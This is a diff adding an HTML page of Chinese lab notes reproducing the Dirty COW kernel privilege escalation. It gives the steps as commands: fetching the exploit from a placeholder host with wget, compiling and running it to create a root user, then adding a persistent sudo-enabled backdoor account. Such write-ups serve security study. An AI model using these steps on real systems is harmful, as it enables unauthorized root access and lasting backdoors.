@@ -1,0 +1,57 @@
+<!doctype html>
+<html>
+<head>
+<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
+<title>脏牛提权复现</title>
+</head>
+<body><h2 id='漏洞介绍'>漏洞介绍</h2>
+<p>漏洞具体是由于get_user_page内核函数在处理Copy-on-Write的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。</p>
+<h2 id='环境搭建'>环境搭建</h2>
+<p>注意影响的内核版本(低于)</p>
+<pre><code>Centos7/RHEL7     3.10.0-327.36.3.el7
+Cetnos6/RHEL6     2.6.32-642.6.2.el6
+Ubuntu 16.10      4.8.0-26.28
+Ubuntu 16.04      4.4.0-45.66
+Ubuntu 14.04      3.13.0-100.147
+Debian 8          3.16.36-1+deb8u2
+Debian 7          3.2.82-1
+</code></pre>
+<p>复现采用的版本</p>
+<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\提权\脏牛\uname.png" referrerpolicy="no-referrer" alt="uname"></p>
+<p>安装apache,php服务</p>
+<pre><code>yum  -y install httpd php
+</code></pre>
+<p>关闭防火墙，开启80端口即可启动httpd服务</p>
+<h2 id='漏洞复现'>漏洞复现</h2>
+<p>上传exp到目标靶机的tmp目录(注意要是可写可编译的目录)</p>
+<pre><code>wget http://xxxx:8000/dirty.c
+</code></pre>
+<p>编译exp</p>
+<pre><code>gcc -pthread dirty.c -o dirty –lcrypt
+</code></pre>
+<p>执行该脚本创建具有root权限的用户</p>
+<pre><code>./dirty 114514
+</code></pre>
+<p>查看etcpasswd能看到名为firefart的root用户</p>
+<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\提权\脏牛\firefart.png" referrerpolicy="no-referrer" alt="firefart"></p>
+<p>使用su命令切换到该用户</p>
+<pre><code>su firefart
+</code></pre>
+<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\提权\脏牛\su命令.png" referrerpolicy="no-referrer" alt="su命令"></p>
+<p>成功提权到root权限，成功后使用脚本保存的/passwd.bak文件恢复原有的文件</p>
+<pre><code>mv /tmp/passwd.bak /etc/passwd
+</code></pre>
+<p>还原后不用急着退出，通过创建新的root权限用户来保存我们原有的root权限</p>
+<pre><code>adduser dirty
+passwd dirty
+</code></pre>
+<p>更改sudoers文件，使dirty用户拥有所有权限</p>
+<p><img src="E:\笔记软件\笔记\渗透测试\漏洞复现\提权\脏牛\dirty.png" referrerpolicy="no-referrer" alt="dirty"></p>
+<p>切换为dirty用户即可执行root用户的命令</p>
+<p><strong>注意</strong></p>
+<p>编译gcc文件最好是在目标靶机上进行编译，谨防模块的缺失和版本不同，利用该漏洞前注意确认内核版本</p>
+<h3 id='参考链接'>参考链接</h3>
+<p><a href='https://github.com/FireFart/dirtycow' target='_blank' class='url'>https://github.com/FireFart/dirtycow</a></p>
+<p><a href='https://xz.aliyun.com/t/9757' target='_blank' class='url'>https://xz.aliyun.com/t/9757</a></p>
+</body>
+</html>
